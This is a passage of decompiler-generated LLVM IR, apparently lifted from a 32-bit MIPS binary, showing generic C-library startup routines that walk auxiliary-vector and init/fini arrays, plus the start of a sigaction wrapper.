  store i32 %arg1, i32* @s0, align 4
  %v2_406ea0 = call i32 @function_404c80()
  %v2_406eb0 = icmp eq i32 %v2_406ea0, -1
  br i1 %v2_406eb0, label %dec_label_pc_406eb4, label %dec_label_pc_406ee8

dec_label_pc_406eb4:                              ; preds = %dec_label_pc_406e74
  %v3_406ebc = load i32, i32* @global_var_449a84.195, align 4
  store i32 %v3_406ebc, i32* @t9, align 4
  %v1_406ec4 = load i32, i32* @s1, align 4
  store i32 %v1_406ec4, i32* @a1, align 4
  %v6_406ec4 = call i32 @function_405070(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_4098a0.254, i32 0, i32 0))
  %v1_406ed0 = load i32, i32* @s0, align 4
  %v2_406ed0 = icmp eq i32 %v6_406ec4, %v1_406ed0
  br i1 %v2_406ed0, label %dec_label_pc_406ee8, label %dec_label_pc_406ed4

dec_label_pc_406ed4:                              ; preds = %dec_label_pc_406eb4
  %v3_406ed8 = load i32, i32* @global_var_449bc0.255, align 4
  store i32 %v3_406ed8, i32* @t9, align 4
  %v1_406ee0 = call i32 @function_407fe0()
  br label %dec_label_pc_406ee8

dec_label_pc_406ee8:                              ; preds = %dec_label_pc_406e74, %dec_label_pc_406eb4, %dec_label_pc_406ed4
  %v4_406ef4 = phi i32 [ %v2_406ea0, %dec_label_pc_406e74 ], [ %v6_406ec4, %dec_label_pc_406eb4 ], [ %v1_406ee0, %dec_label_pc_406ed4 ]
  ret i32 %v4_406ef4

; uselistorder directives
  uselistorder label %dec_label_pc_406ee8, { 2, 1, 0 }
}

define i32 @function_406efc() local_unnamed_addr {
dec_label_pc_406efc:
  %v3_406f1c = load i32, i32* @global_var_449de4.256, align 4
  %v1_406f24 = icmp eq i32 %v3_406f1c, 0
  br i1 %v1_406f24, label %dec_label_pc_406f28, label %dec_label_pc_406f78

dec_label_pc_406f28:                              ; preds = %dec_label_pc_406efc
  store i32 1, i32* @global_var_449de4.256, align 4
  %v3_406f30 = load i32, i32* @global_var_449b80, align 4
  %v2_406f38 = inttoptr i32 %v3_406f30 to i32*
  store i32 4096, i32* %v2_406f38, align 4
  %v3_406f3c = load i32, i32* @global_var_449c2c.257, align 4
  %v1_406f44 = icmp eq i32 %v3_406f3c, 0
  br i1 %v1_406f44, label %dec_label_pc_406f5c, label %dec_label_pc_406f48

dec_label_pc_406f48:                              ; preds = %dec_label_pc_406f28
  %v1_406f4c = call i32 @unknown_0()
  br label %dec_label_pc_406f5c

dec_label_pc_406f5c:                              ; preds = %dec_label_pc_406f28, %dec_label_pc_406f48
  %v3_406f5c = load i32, i32* @global_var_449b64.258, align 4
  %v1_406f64 = icmp eq i32 %v3_406f5c, 0
  br i1 %v1_406f64, label %dec_label_pc_406f78, label %dec_label_pc_406f68

dec_label_pc_406f68:                              ; preds = %dec_label_pc_406f5c
  %v4_406f70 = call i32 @unknown_0()
  br label %dec_label_pc_406f78

dec_label_pc_406f78:                              ; preds = %dec_label_pc_406efc, %dec_label_pc_406f5c, %dec_label_pc_406f68
  %v4_406f80 = phi i32 [ 1, %dec_label_pc_406efc ], [ 0, %dec_label_pc_406f5c ], [ %v4_406f70, %dec_label_pc_406f68 ]
  ret i32 %v4_406f80

; uselistorder directives
  uselistorder label %dec_label_pc_406f78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_406f5c, { 1, 0 }
}

define i32 @function_406f88(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406f88:
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %a2.global-to-local, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-152 = alloca i32, align 4
  %v1_406f90 = load i32, i32* @t9, align 4
  %v2_406f90 = add i32 %v1_406f90, 305880
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v1_406fb8 = mul i32 %arg2, 4
  store i32 %tmp, i32* %s2.global-to-local, align 4
  %v2_406fc4 = add i32 %tmp, %v1_406fb8
  store i32 %v2_406fc4, i32* %a2.global-to-local, align 4
  %v3_406fc8 = load i32, i32* bitcast (i32** @global_var_449cf4.259 to i32*), align 4
  %v3_406fcc = load i32, i32* bitcast (i32** @global_var_449c8c.261 to i32*), align 4
  store i32 %v3_406fcc, i32* %s0.global-to-local, align 4
  %v2_406fd0 = inttoptr i32 %v3_406fc8 to i32*
  store i32 %arg7, i32* %v2_406fd0, align 4
  %v3_406fd4 = load i32, i32* bitcast (i32** @global_var_449aa8.253 to i32*), align 4
  store i32 %v3_406fd4, i32* %v0.global-to-local, align 4
  store i32 %arg6, i32* %v1.global-to-local, align 4
  %v0_406fe0 = load i32, i32* %a2.global-to-local, align 4
  %v1_406fe0 = add i32 %v0_406fe0, 4
  store i32 %v1_406fe0, i32* %a1.global-to-local, align 4
  %v2_406fe4 = inttoptr i32 %v3_406fd4 to i32*
  store i32 %arg6, i32* %v2_406fe4, align 4
  %v0_406fe8 = load i32, i32* %a1.global-to-local, align 4
  %v1_406fe8 = load i32, i32* %s0.global-to-local, align 4
  %v2_406fe8 = inttoptr i32 %v1_406fe8 to i32*
  store i32 %v0_406fe8, i32* %v2_406fe8, align 4
  %v0_406fec = load i32, i32* %s2.global-to-local, align 4
  %v1_406fec = inttoptr i32 %v0_406fec to i32*
  %v2_406fec = load i32, i32* %v1_406fec, align 4
  store i32 %v2_406fec, i32* %v0.global-to-local, align 4
  store i32 %arg1, i32* %s5.global-to-local, align 4
  %v0_406ff4 = load i32, i32* %a1.global-to-local, align 4
  %v2_406ff4 = icmp eq i32 %v0_406ff4, %v2_406fec
  store i32 %arg4, i32* %s3.global-to-local, align 4
  br i1 %v2_406ff4, label %dec_label_pc_406ff8, label %dec_label_pc_407000

dec_label_pc_406ff8:                              ; preds = %dec_label_pc_406f88
  %v0_406ffc = load i32, i32* %a2.global-to-local, align 4
  %v1_406ffc = load i32, i32* %s0.global-to-local, align 4
  %v2_406ffc = inttoptr i32 %v1_406ffc to i32*
  store i32 %v0_406ffc, i32* %v2_406ffc, align 4
  br label %dec_label_pc_407000

dec_label_pc_407000:                              ; preds = %dec_label_pc_406f88, %dec_label_pc_406ff8
  %v2_407004 = ptrtoint i32* %stack_var_-152 to i32
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 120, i32* %a2.global-to-local, align 4
  %v5_40700c = call i32 @function_405830(i32* nonnull %stack_var_-152, i32 0, i32 120)
  store i32 %v5_40700c, i32* %v0.global-to-local, align 4
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v2_407018 = load i32, i32* bitcast (i32** @global_var_449c8c.261 to i32*), align 4
  store i32 %v2_407018, i32* %v1.global-to-local, align 4
  %v0_407024.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_407024

dec_label_pc_407024:                              ; preds = %dec_label_pc_407024, %dec_label_pc_407000
  %v0_407024 = phi i32 [ %v3_407030, %dec_label_pc_407024 ], [ %v0_407024.pre, %dec_label_pc_407000 ]
  store i32 %v0_407024, i32* %v1.global-to-local, align 4
  %v1_407028 = inttoptr i32 %v0_407024 to i32*
  %v2_407028 = load i32, i32* %v1_407028, align 4
  store i32 %v2_407028, i32* %v0.global-to-local, align 4
  %v1_407030 = icmp eq i32 %v2_407028, 0
  %v3_407030 = add i32 %v0_407024, 4
  store i32 %v3_407030, i32* %a1.global-to-local, align 4
  br i1 %v1_407030, label %dec_label_pc_407034, label %dec_label_pc_407024

dec_label_pc_407034:                              ; preds = %dec_label_pc_407024
  store i32 %v3_407030, i32* @s0, align 4
  br label %dec_label_pc_407040

dec_label_pc_407040:                              ; preds = %dec_label_pc_407064, %dec_label_pc_407034
  %v0_407054 = phi i32 [ %v1_407064, %dec_label_pc_407064 ], [ %v3_407030, %dec_label_pc_407034 ]
  %v0_407040 = phi i32 [ %v4_407070, %dec_label_pc_407064 ], [ 0, %dec_label_pc_407034 ]
  %v1_407040 = icmp eq i32 %v0_407040, 0
  store i32 %v2_407004, i32* %v0.global-to-local, align 4
  br i1 %v1_407040, label %dec_label_pc_407064, label %dec_label_pc_407044

dec_label_pc_407044:                              ; preds = %dec_label_pc_407040
  %v0_40704c = load i32, i32* @a0, align 4
  %v1_40704c = mul i32 %v0_40704c, 8
  %v2_407050 = add i32 %v1_40704c, %v2_407004
  store i32 %v2_407050, i32* @a0, align 4
  store i32 %v0_407054, i32* @a1, align 4
  store i32 8, i32* @a2, align 4
  %v1_407058 = call i32 @function_407ea0()
  store i32 %v1_407058, i32* %v0.global-to-local, align 4
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v0_407064.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_407064

dec_label_pc_407064:                              ; preds = %dec_label_pc_407040, %dec_label_pc_407044
  %v0_407064 = phi i32 [ %v0_407054, %dec_label_pc_407040 ], [ %v0_407064.pre, %dec_label_pc_407044 ]
  %v1_407064 = add i32 %v0_407064, 8
  store i32 %v1_407064, i32* @s0, align 4
  %v1_407068 = inttoptr i32 %v1_407064 to i32*
  %v2_407068 = load i32, i32* %v1_407068, align 4
  store i32 %v2_407068, i32* @a0, align 4
  %v1_407070 = icmp eq i32 %v2_407068, 0
  %v3_407070 = icmp ult i32 %v2_407068, 15
  %v4_407070 = zext i1 %v3_407070 to i32
  store i32 %v4_407070, i32* %v0.global-to-local, align 4
  br i1 %v1_407070, label %dec_label_pc_407074, label %dec_label_pc_407040

dec_label_pc_407074:                              ; preds = %dec_label_pc_407064
  %v3_407078 = load i32, i32* @global_var_449b54.262, align 4
  store i32 %v3_407078, i32* @t9, align 4
  %v5_407080 = call i32 @function_408190(i32 %v2_407004)
  store i32 %v5_407080, i32* %v0.global-to-local, align 4
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v3_407090 = load i32, i32* @global_var_449aac.263, align 4
  store i32 %v3_407090, i32* @t9, align 4
  %v1_407098 = call i32 @function_406efc()
  store i32 %v1_407098, i32* %v0.global-to-local, align 4
  store i32 %tmp27, i32* %v1.global-to-local, align 4
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v1_4070a8 = icmp eq i32 %tmp27, 0
  br i1 %v1_4070a8, label %dec_label_pc_4070ac, label %dec_label_pc_4070b4

dec_label_pc_4070ac:                              ; preds = %dec_label_pc_407074
  store i32 4096, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4070b4

dec_label_pc_4070b4:                              ; preds = %dec_label_pc_407074, %dec_label_pc_4070ac
  %v0_4070bc = phi i32 [ %tmp27, %dec_label_pc_407074 ], [ 4096, %dec_label_pc_4070ac ]
  %v3_4070b4 = load i32, i32* @global_var_449b80, align 4
  store i32 -1, i32* %s1.global-to-local, align 4
  %v2_4070bc = inttoptr i32 %v3_4070b4 to i32*
  store i32 %v0_4070bc, i32* %v2_4070bc, align 4
  store i32 %tmp26, i32* %v0.global-to-local, align 4
  %v1_4070c8 = load i32, i32* %s1.global-to-local, align 4
  %v2_4070c8 = icmp eq i32 %tmp26, %v1_4070c8
  br i1 %v2_4070c8, label %dec_label_pc_4070cc, label %dec_label_pc_407138

dec_label_pc_4070cc:                              ; preds = %dec_label_pc_4070b4
  %v3_4070d0 = load i32, i32* @global_var_449b44.264, align 4
  store i32 %v3_4070d0, i32* @t9, align 4
  %v1_4070d8 = call i32 @function_407960()
  store i32 %v1_4070d8, i32* %v0.global-to-local, align 4
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v3_4070e8 = load i32, i32* @global_var_449b60.265, align 4
  store i32 %v3_4070e8, i32* @t9, align 4
  store i32 %v1_4070d8, i32* @s0, align 4
  %v2_4070f0 = call i32 @function_407870()
  store i32 %v2_4070f0, i32* %v0.global-to-local, align 4
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v0_4070fc = load i32, i32* @s0, align 4
  %v2_4070fc = icmp eq i32 %v0_4070fc, %v2_4070f0
  br i1 %v2_4070fc, label %dec_label_pc_407100, label %dec_label_pc_40716c

dec_label_pc_407100:                              ; preds = %dec_label_pc_4070cc
  %v3_407104 = load i32, i32* @global_var_449c78.266, align 4
  store i32 %v3_407104, i32* @t9, align 4
  %v1_40710c = call i32 @function_4078d0()
  store i32 %v1_40710c, i32* %v0.global-to-local, align 4
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v3_40711c = load i32, i32* @global_var_449bf4.267, align 4
  store i32 %v3_40711c, i32* @t9, align 4
  store i32 %v1_40710c, i32* @s0, align 4
  %v2_407124 = call i32 @function_407810()
  store i32 %v2_407124, i32* %v0.global-to-local, align 4
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v0_407130 = load i32, i32* @s0, align 4
  %v2_407130 = icmp eq i32 %v0_407130, %v2_407124
  br i1 %v2_407130, label %dec_label_pc_407100.dec_label_pc_407138_crit_edge, label %dec_label_pc_40716c

dec_label_pc_407100.dec_label_pc_407138_crit_edge: ; preds = %dec_label_pc_407100
  %v1_407140.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_407138

dec_label_pc_407138:                              ; preds = %dec_label_pc_407100.dec_label_pc_407138_crit_edge, %dec_label_pc_4070b4
  %v1_407140 = phi i32 [ %v1_407140.pre, %dec_label_pc_407100.dec_label_pc_407138_crit_edge ], [ %v1_4070c8, %dec_label_pc_4070b4 ]
  store i32 %tmp26, i32* %v1.global-to-local, align 4
  %v2_407140 = icmp eq i32 %tmp26, %v1_407140
  br i1 %v2_407140, label %dec_label_pc_4071b0, label %dec_label_pc_407144

dec_label_pc_407144:                              ; preds = %dec_label_pc_407138
  store i32 %tmp25, i32* %v0.global-to-local, align 4
  %v2_407150 = icmp eq i32 %tmp26, %tmp25
  br i1 %v2_407150, label %dec_label_pc_407154, label %dec_label_pc_40716c

dec_label_pc_407154:                              ; preds = %dec_label_pc_407144
  store i32 %tmp24, i32* %v1.global-to-local, align 4
  store i32 %tmp23, i32* %v0.global-to-local, align 4
  %v2_407164 = icmp eq i32 %tmp24, %tmp23
  br i1 %v2_407164, label %dec_label_pc_4071b0, label %dec_label_pc_40716c

dec_label_pc_40716c:                              ; preds = %dec_label_pc_407154, %dec_label_pc_407144, %dec_label_pc_407100, %dec_label_pc_4070cc
  %v0_40716c = load i32, i32* %gp.global-to-local, align 4
  %v1_40716c = add i32 %v0_40716c, -32736
  %v2_40716c = inttoptr i32 %v1_40716c to i32*
  %v3_40716c = load i32, i32* %v2_40716c, align 4
  store i32 %v3_40716c, i32* %v0.global-to-local, align 4
  %v1_407174 = add i32 %v3_40716c, 28276
  store i32 %v1_407174, i32* %s1.global-to-local, align 4
  store i32 131072, i32* %a1.global-to-local, align 4
  store i32 131072, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_407174)
  store i32 131074, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_407174)
  store i32 131074, i32* %a1.global-to-local, align 4
  %v0_40719c = load i32, i32* %s1.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_40719c)
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4071b0

dec_label_pc_4071b0:                              ; preds = %dec_label_pc_407154, %dec_label_pc_407138, %dec_label_pc_40716c
  %v0_4071b0 = load i32, i32* %gp.global-to-local, align 4
  %v1_4071b0 = add i32 %v0_4071b0, -32704
  %v2_4071b0 = inttoptr i32 %v1_4071b0 to i32*
  %v3_4071b0 = load i32, i32* %v2_4071b0, align 4
  store i32 %v3_4071b0, i32* %v1.global-to-local, align 4
  %v3_4071b4 = load i32, i32* %v2_4071b0, align 4
  store i32 %v3_4071b4, i32* %v0.global-to-local, align 4
  %v0_4071b8 = load i32, i32* %s2.global-to-local, align 4
  %v1_4071b8 = inttoptr i32 %v0_4071b8 to i32*
  %v2_4071b8 = load i32, i32* %v1_4071b8, align 4
  %v2_4071bc = sub i32 %v3_4071b4, %v3_4071b0
  store i32 %v2_4071bc, i32* %v0.global-to-local, align 4
  %v1_4071c0 = sdiv i32 %v2_4071bc, 4
  store i32 %v1_4071c0, i32* %s1.global-to-local, align 4
  %v1_4071c4 = add i32 %v0_4071b0, -32688
  %v2_4071c4 = inttoptr i32 %v1_4071c4 to i32*
  %v3_4071c4 = load i32, i32* %v2_4071c4, align 4
  store i32 %v3_4071c4, i32* %v0.global-to-local, align 4
  store i32 %arg5, i32* %v1.global-to-local, align 4
  %v2_4071cc = inttoptr i32 %v3_4071c4 to i32*
  store i32 %v2_4071b8, i32* %v2_4071cc, align 4
  %v0_4071d0 = load i32, i32* %gp.global-to-local, align 4
  %v1_4071d0 = add i32 %v0_4071d0, -32700
  %v2_4071d0 = inttoptr i32 %v1_4071d0 to i32*
  %v3_4071d0 = load i32, i32* %v2_4071d0, align 4
  store i32 %v3_4071d0, i32* %v0.global-to-local, align 4
  store i32 0, i32* %s0.global-to-local, align 4
  %v0_4071dc = load i32, i32* %v1.global-to-local, align 4
  %v2_4071dc = inttoptr i32 %v3_4071d0 to i32*
  store i32 %v0_4071dc, i32* %v2_4071dc, align 4
  %v0_4071e0.pre = load i32, i32* %gp.global-to-local, align 4
  %v0_4071e8.pre = load i32, i32* %v0.global-to-local, align 4
  %v1_4071f4.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4071e0

dec_label_pc_4071e0:                              ; preds = %dec_label_pc_4071e0, %dec_label_pc_4071b0
  %v1_4071f4 = phi i32 [ %v2_4071f4, %dec_label_pc_4071e0 ], [ %v1_4071f4.pre, %dec_label_pc_4071b0 ]
  %v0_4071e8 = phi i32 [ %v3_407204, %dec_label_pc_4071e0 ], [ %v0_4071e8.pre, %dec_label_pc_4071b0 ]
  %v0_4071e0 = phi i32 [ %v2_406f90, %dec_label_pc_4071e0 ], [ %v0_4071e0.pre, %dec_label_pc_4071b0 ]
  %v1_4071e0 = add i32 %v0_4071e0, -32704
  %v2_4071e0 = inttoptr i32 %v1_4071e0 to i32*
  %v3_4071e0 = load i32, i32* %v2_4071e0, align 4
  store i32 %v3_4071e0, i32* %v1.global-to-local, align 4
  %v2_4071e8 = add i32 %v3_4071e0, %v0_4071e8
  store i32 %v2_4071e8, i32* %v0.global-to-local, align 4
  %v1_4071ec = inttoptr i32 %v2_4071e8 to i32*
  %v2_4071ec = load i32, i32* %v1_4071ec, align 4
  %v2_4071f4 = add i32 %v1_4071f4, 1
  store i32 %v2_4071f4, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_4071ec)
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v1_407200 = load i32, i32* %s1.global-to-local, align 4
  %v2_407200 = icmp ult i32 %v2_4071f4, %v1_407200
  %v3_407204 = mul i32 %v2_4071f4, 4
  store i32 %v3_407204, i32* %v0.global-to-local, align 4
  br i1 %v2_407200, label %dec_label_pc_4071e0, label %dec_label_pc_407208

dec_label_pc_407208:                              ; preds = %dec_label_pc_4071e0
  %v0_40720c = load i32, i32* %s3.global-to-local, align 4
  %v1_40720c = icmp eq i32 %v0_40720c, 0
  br i1 %v1_40720c, label %dec_label_pc_407224, label %dec_label_pc_407210

dec_label_pc_407210:                              ; preds = %dec_label_pc_407208
  call void @__pseudo_call(i32 %v0_40720c)
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_407224

dec_label_pc_407224:                              ; preds = %dec_label_pc_407208, %dec_label_pc_407210
  %v3_407224 = load i32, i32* @global_var_449aa0, align 4
  store i32 %v3_407224, i32* %v1.global-to-local, align 4
  store i32 0, i32* %s0.global-to-local, align 4
  store i32 0, i32* %v0.global-to-local, align 4
  store i32 0, i32* %s1.global-to-local, align 4
  %v1_40723c = add i32 %v1_406f90, 273176
  %v2_40723c = inttoptr i32 %v1_40723c to i32*
  br label %dec_label_pc_40723c

dec_label_pc_40723c:                              ; preds = %dec_label_pc_40723c, %dec_label_pc_407224
  %v1_407250 = phi i32 [ %v2_407250, %dec_label_pc_40723c ], [ 0, %dec_label_pc_407224 ]
  %v0_407244 = phi i32 [ %v3_407260, %dec_label_pc_40723c ], [ 0, %dec_label_pc_407224 ]
  %v3_40723c = load i32, i32* %v2_40723c, align 4
  store i32 %v3_40723c, i32* %v1.global-to-local, align 4
  %v2_407244 = add i32 %v3_40723c, %v0_407244
  store i32 %v2_407244, i32* %v0.global-to-local, align 4
  %v1_407248 = inttoptr i32 %v2_407244 to i32*
  %v2_407248 = load i32, i32* %v1_407248, align 4
  %v2_407250 = add i32 %v1_407250, 1
  store i32 %v2_407250, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_407248)
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v1_40725c = load i32, i32* %s1.global-to-local, align 4
  %v2_40725c = icmp ult i32 %v2_407250, %v1_40725c
  %v3_407260 = mul i32 %v2_407250, 4
  store i32 %v3_407260, i32* %v0.global-to-local, align 4
  br i1 %v2_40725c, label %dec_label_pc_40723c, label %dec_label_pc_407264

dec_label_pc_407264:                              ; preds = %dec_label_pc_40723c
  %v3_407268 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_407268, i32* %v0.global-to-local, align 4
  %v1_407270 = icmp eq i32 %v3_407268, 0
  br i1 %v1_407270, label %dec_label_pc_407290, label %dec_label_pc_407274

dec_label_pc_407274:                              ; preds = %dec_label_pc_407264
  store i32 %v3_407268, i32* @t9, align 4
  %v1_407280 = call i32 @function_4057a0()
  store i32 %v1_407280, i32* %v0.global-to-local, align 4
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v1_40728c = inttoptr i32 %v1_407280 to i32*
  store i32 0, i32* %v1_40728c, align 4
  br label %dec_label_pc_407290

dec_label_pc_407290:                              ; preds = %dec_label_pc_407264, %dec_label_pc_407274
  %v3_407290 = load i32, i32* @global_var_449bb4.268, align 4
  store i32 %v3_407290, i32* %v0.global-to-local, align 4
  %v1_407298 = icmp eq i32 %v3_407290, 0
  br i1 %v1_407298, label %dec_label_pc_4072b8, label %dec_label_pc_40729c

dec_label_pc_40729c:                              ; preds = %dec_label_pc_407290
  %v1_4072a8 = call i32 @unknown_0()
  store i32 %v1_4072a8, i32* %v0.global-to-local, align 4
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v1_4072b4 = inttoptr i32 %v1_4072a8 to i32*
  store i32 0, i32* %v1_4072b4, align 4
  br label %dec_label_pc_4072b8

dec_label_pc_4072b8:                              ; preds = %dec_label_pc_407290, %dec_label_pc_40729c
  %v0_4072b8 = load i32, i32* %gp.global-to-local, align 4
  %v1_4072b8 = add i32 %v0_4072b8, -32212
  %v2_4072b8 = inttoptr i32 %v1_4072b8 to i32*
  %v3_4072b8 = load i32, i32* %v2_4072b8, align 4
  store i32 %v3_4072b8, i32* @v0, align 4
  %v1_4072c0 = inttoptr i32 %v3_4072b8 to i32*
  %v2_4072c0 = load i32, i32* %v1_4072c0, align 4
  store i32 %v2_4072c0, i32* %a2.global-to-local, align 4
  %v0_4072c4 = load i32, i32* %s5.global-to-local, align 4
  store i32 4223696, i32* @ra, align 4
  %v1_4072c8 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_4072c8, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_4072c4)
  store i32 %v2_406f90, i32* %gp.global-to-local, align 4
  %v3_4072d8 = load i32, i32* @global_var_449ab4.269, align 4
  store i32 %v3_4072d8, i32* @t9, align 4
  %v1_4072e0 = load i32, i32* @v0, align 4
  %v3_4072e0 = call i32 @function_4068c0(i32 %v1_4072e0)
  store i32 %v3_4072e0, i32* %v0.global-to-local, align 4
  ret i32 %v3_4072e0

; uselistorder directives
  uselistorder i32 %v2_407250, { 2, 0, 3, 1 }
  uselistorder i32 %v2_4071f4, { 2, 0, 3, 1 }
  uselistorder i32 %v4_407070, { 1, 0 }
  uselistorder i32 %v1_407064, { 1, 2, 0 }
  uselistorder i32 %v3_407030, { 0, 1, 3, 2 }
  uselistorder i32 %v0_407024, { 2, 1, 0 }
  uselistorder i32 %v2_407004, { 1, 0, 2 }
  uselistorder i32 %v2_406f90, { 6, 5, 4, 7, 3, 8, 0, 2, 9, 10, 11, 12, 13, 14, 1, 15, 16 }
  uselistorder i32 %tmp27, { 0, 2, 1 }
  uselistorder i32 %tmp26, { 0, 4, 3, 2, 1 }
  uselistorder i32 %tmp25, { 1, 0 }
  uselistorder i32 %tmp24, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 2, 1, 17, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 22, 21, 23, 25, 24, 29, 26, 27, 28, 30, 31 }
  uselistorder i32* %gp.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 12, 13, 14, 7, 15, 8, 9, 10, 11, 16, 17, 18, 19, 20 }
  uselistorder i32* %a2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %a1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 (i32)* @function_4068c0, { 1, 0 }
  uselistorder i32 4096, { 0, 2, 1, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 15, { 3, 1, 0, 2 }
  uselistorder i32 ()* @function_407ea0, { 1, 0 }
  uselistorder i32 120, { 1, 2, 0, 3 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_4072b8, { 1, 0 }
  uselistorder label %dec_label_pc_407290, { 1, 0 }
  uselistorder label %dec_label_pc_407224, { 1, 0 }
  uselistorder label %dec_label_pc_4071b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_4070b4, { 1, 0 }
  uselistorder label %dec_label_pc_407064, { 1, 0 }
  uselistorder label %dec_label_pc_407000, { 1, 0 }
}

define i32 @function_4072f0(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4072f0:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp8 = alloca i32, align 4
  store i32 %tmp, i32* %s0.global-to-local, align 4
  store i32 %arg3, i32* %s1.global-to-local, align 4
  %v1_40732c = icmp eq i32* %arg2, null
  br i1 %v1_40732c, label %dec_label_pc_40735c, label %dec_label_pc_407330

dec_label_pc_407330:                              ; preds = %dec_label_pc_4072f0
  call void @__pseudo_call(i32 ptrtoint (i32* @global_var_407ea0.211 to i32))
  %v0_407340 = load i32, i32* %s0.global-to-local, align 4
  %v1_407340 = add i32 %v0_407340, 136
  %v2_407340 = inttoptr i32 %v1_407340 to i32*
  %v3_407340 = load i32, i32* %v2_407340, align 4
  store i32 %v3_407340, i32* @v1, align 4
  %v1_407344 = inttoptr i32 %v0_407340 to i32*
  %v2_407344 = load i32, i32* %v1_407344, align 4
  store i32 %v2_407344, i32* @v0, align 4
  br label %dec_label_pc_40735c

dec_label_pc_40735c:                              ; preds = %dec_label_pc_4072f0, %dec_label_pc_407330
  %v3_40736c = load i32, i32* @global_var_449bd4.270, align 4
  store i32 16, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_40736c)
  %v0_407380 = load i32, i32* %s1.global-to-local, align 4
  %v1_407380 = icmp eq i32 %v0_407380, 0
  %v2_407380 = load i32, i32* @v0, align 4
  store i32 %v2_407380, i32* %s0.global-to-local, align 4
  br i1 %v1_407380, label %dec_label_pc_4073bc, label %dec_label_pc_407384

dec_label_pc_407384:                              ; preds = %dec_label_pc_40735c
  %v1_407394 = icmp slt i32 %v2_407380, 0
  br i1 %v1_407394, label %dec_label_pc_4073bc, label %dec_label_pc_407398

dec_label_pc_407398:                              ; preds = %dec_label_pc_407384
  call void @__pseudo_call(i32 ptrtoint (i32* @global_var_407ea0.211 to i32))
  %v3_4073ac = load i32, i32* %tmp8, align 4
  %v1_4073b4 = load i32, i32* %s1.global-to-local, align 4
  %v2_4073b4 = inttoptr i32 %v1_4073b4 to i32*
  store i32 %v3_4073ac, i32* %v2_4073b4, align 4
  %v0_4073b8 = load i32, i32* @v1, align 4
  %v1_4073b8 = load i32, i32* %s1.global-to-local, align 4
  %v2_4073b8 = add i32 %v1_4073b8, 136
  %v3_4073b8 = inttoptr i32 %v2_4073b8 to i32*
  store i32 %v0_4073b8, i32* %v3_4073b8, align 4
  %v0_4073bc.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4073bc

dec_label_pc_4073bc:                              ; preds = %dec_label_pc_407384, %dec_label_pc_40735c, %dec_label_pc_407398
  %v0_4073bc = phi i32 [ %v2_407380, %dec_label_pc_407384 ], [ %v2_407380, %dec_label_pc_40735c ], [ %v0_4073bc.pre, %dec_label_pc_407398 ]
  ret i32 %v0_4073bc

; uselistorder directives
  uselistorder i32* @v1, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder label %dec_label_pc_4073bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_40735c, { 1, 0 }
}

define i32 @function_4073e0(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
